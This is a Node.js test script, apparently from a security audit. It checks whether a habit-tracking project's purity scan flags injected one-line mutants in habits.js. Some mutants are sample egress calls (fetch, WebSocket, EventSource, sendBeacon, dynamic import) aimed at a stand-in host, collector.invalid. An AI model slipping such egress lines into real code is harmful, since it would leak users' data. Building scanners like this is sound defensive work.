// Security solver probe (SEC-03): the purity scan before and after the fix, on the auditor's mirrors and on
// further mutants. OLD is tests/purity.test.js as of 59c6ee5 (each auditor mirror holds a byte-identical
// copy). NEW is tests/purity.test.js in the working tree. Each run is one purity test file in a child
// Node process capped at 60 s. Mutants are served to the scan by scan-hook.mjs, so nothing is copied or
// changed on disk. It writes no file. Usage: node scan-mutants.mjs
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const root = new URL("../../../../../../", import.meta.url);
const HOOK = new URL("scan-hook.mjs", import.meta.url).href; // --import takes a URL, a bare D:\ path fails
const mirrors = new URL("docs/modules/habit-logic/qa/security/20261009T115752/mirrors/", root);
const mirror = (name, part) => fileURLToPath(new URL(`${name}/${part}`, mirrors));
const NEW_TEST = fileURLToPath(new URL("tests/purity.test.js", root));
const OLD_TEST = (name = "baseline-unchanged") => mirror(name, "tests/purity.test.js");

function scan(testFile, env) {
  const result = spawnSync(process.execPath, ["--import", HOOK, "--test-reporter=spec", testFile], {
    cwd: fileURLToPath(root),
    env: { ...process.env, ...env },
    encoding: "utf8",
    timeout: 60_000,
    killSignal: "SIGKILL",
  });
  if (result.error) return `ERROR ${result.error.code} (child pid ${result.pid})`;
  const lines = result.stdout.split(/\r?\n/);
  const count = (label) => lines.find((line) => line.startsWith(`ℹ ${label} `))?.split(" ")[2];
  const failed = lines.filter((line) => line.startsWith("✖ @")).map((line) => line.replace(/ \([\d.]+ms\)$/, ""));
  const messages = lines.filter((line) => /^\s+AssertionError/.test(line)).map((line) => line.trim().replace(/^AssertionError \[ERR_ASSERTION\]: /, ""));
  const served = result.stderr.split(/\r?\n/).filter((line) => line.startsWith("scan-hook:")).length;
  // A run whose counts cannot be read did not run its tests, so it is never reported as green.
  if (count("pass") === undefined || count("fail") === undefined) {
    return `BROKEN: no test counts (child pid ${result.pid}, exit ${result.status}), stderr: ${result.stderr.trim().split(/\r?\n/).slice(-3).join(" / ")}`;
  }
  const verdict = Number(count("fail")) > 0 ? "RED" : "GREEN";
  const detail = failed.length ? ` | failed: ${[...new Set(failed)].map((title, i) => `${title} [${messages[i] ?? "?"}]`).join("; ")}` : "";
  return `${verdict} ${count("pass")} pass ${count("fail")} fail (child pid ${result.pid}, exit ${result.status}, hook served ${served} reads)${detail}`;
}

console.log(`node ${process.version} ${process.platform}`);

console.log("\n## The auditor's mirrors (src/ read from the mirror)");
for (const name of ["baseline-unchanged", "control-clock-new-Date-with-parens", "clock-new-Date-without-parens",
  "clock-Date-called-as-function", "egress-fetch-and-sessionStorage"]) {
  console.log(`${name}`);
  console.log(`  OLD: ${scan(OLD_TEST(name), {})}`);
  console.log(`  NEW: ${scan(NEW_TEST, { SCAN_SRC_DIR: mirror(name, "src") })}`);
}

const ANCHOR = "const NEXT_DAY = 1;";
const insert = (line) => JSON.stringify(["habits.js", ANCHOR, `${ANCHOR}\n${line}`]);
const MUTANTS = {
  "new Date; with no parentheses": "const clockRead = new Date;",
  "Date() called as a function": "const clockText = Date();",
  "Date.now without a call": "const clockRead = Date.now;",
  "new Date with a comment inside the parentheses": "const clockRead = new Date(/* today */);",
  "new Date( ) with a space (the old pattern catches this)": "const clockRead = new Date( );",
  "performance.now()": "const clockRead = performance.now();",
  "Math.random()": "const randomRead = Math.random();",
  "crypto.randomUUID()": "const randomRead = crypto.randomUUID();",
  "fetch alone": 'fetch("https://collector.invalid/streaks");',
  "sessionStorage alone": 'sessionStorage.setItem("streaks.last", "x");',
  "localStorage (the old scan catches this)": 'localStorage.setItem("streaks.last", "x");',
  "indexedDB": 'const store = indexedDB.open("streaks");',
  "caches": 'const store = caches.open("streaks");',
  "XMLHttpRequest": "const request = new XMLHttpRequest();",
  "WebSocket": 'const socket = new WebSocket("wss://collector.invalid");',
  "EventSource": 'const events = new EventSource("https://collector.invalid");',
  "navigator.sendBeacon": 'navigator.sendBeacon("https://collector.invalid", "x");',
  "dynamic import (the old import-count test catches this)": 'const loaded = import("https://collector.invalid/x.js");',
  "setTimeout": "setTimeout(() => {}, 0);",
  "queueMicrotask": "queueMicrotask(() => {});",
  "process.env": "const zone = process.env.TZ;",
  "self": "const scope = self;",
};
const ALLOWED = {
  "new Date(2026, 9, 8)": "const fixedDay = new Date(2026, 9, 8);",
  "new Date(key)": "const dayOf = (key) => new Date(key);",
  "Date.UTC(2026, 0, 1)": "const fixedTime = Date.UTC(2026, 0, 1);",
  "all three allowed forms on one line": "const allowed = [new Date(2026, 9, 8), new Date(\"2026-10-08\"), Date.UTC(2026, 0, 1)];",
  "a comment that names banned words": "// fetch, process, the window and a timer are words a comment may use",
};

for (const [title, cases] of [["Further mutants, one line added to habits.js after the NEXT_DAY constant (must be RED)", MUTANTS],
  ["Allowed lines, added the same way (must stay GREEN)", ALLOWED]]) {
  console.log(`\n## ${title}`);
  for (const [label, line] of Object.entries(cases)) {
    console.log(`${label}: ${line}`);
    console.log(`  OLD: ${scan(OLD_TEST(), { SCAN_EDIT: insert(line) })}`);
    console.log(`  NEW: ${scan(NEW_TEST, { SCAN_EDIT: insert(line) })}`);
  }
}

console.log("\n## The real source, no hook edit");
console.log(`  NEW: ${scan(NEW_TEST, {})}`);
